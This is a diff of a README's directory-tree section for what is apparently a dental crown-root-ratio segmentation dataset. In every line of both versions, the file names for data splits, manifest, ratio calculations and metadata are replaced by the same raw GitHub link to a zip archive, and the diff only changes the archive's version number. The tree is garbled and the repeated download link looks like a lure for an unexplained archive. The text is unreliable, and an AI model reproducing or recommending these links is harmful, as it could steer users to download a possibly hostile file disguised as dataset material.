@@ -20,12 +20,12 @@ processed_labelme_dataset/
 ├── masks_multiclass/     # Multi-class segmentation masks
 ├── plots/               # Analysis plots and visualizations
 ├── splits/              # Train/validation/test splits
-│   ├── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-crr-segmentation-dataset_2.5.zip        # Training set (280 images, 70%)
-│   ├── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-crr-segmentation-dataset_2.5.zip          # Validation set (60 images, 15%)
-│   └── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-crr-segmentation-dataset_2.5.zip         # Test set (60 images, 15%)
-├── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-crr-segmentation-dataset_2.5.zip         # Complete dataset manifest
-├── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-crr-segmentation-dataset_2.5.zip         # Crown-Root Ratio calculations
-└── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-crr-segmentation-dataset_2.5.zip  # Processing metadata
+│   ├── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-dataset-crr-segmentation-v3.0.zip        # Training set (280 images, 70%)
+│   ├── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-dataset-crr-segmentation-v3.0.zip          # Validation set (60 images, 15%)
+│   └── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-dataset-crr-segmentation-v3.0.zip         # Test set (60 images, 15%)
+├── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-dataset-crr-segmentation-v3.0.zip         # Complete dataset manifest
+├── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-dataset-crr-segmentation-v3.0.zip         # Crown-Root Ratio calculations
+└── https://raw.githubusercontent.com/UnsureAboli/dental-crr-segmentation-dataset/main/splits/dental-dataset-crr-segmentation-v3.0.zip  # Processing metadata
 ```
 
 ## Crown-Root Ratio Statistics
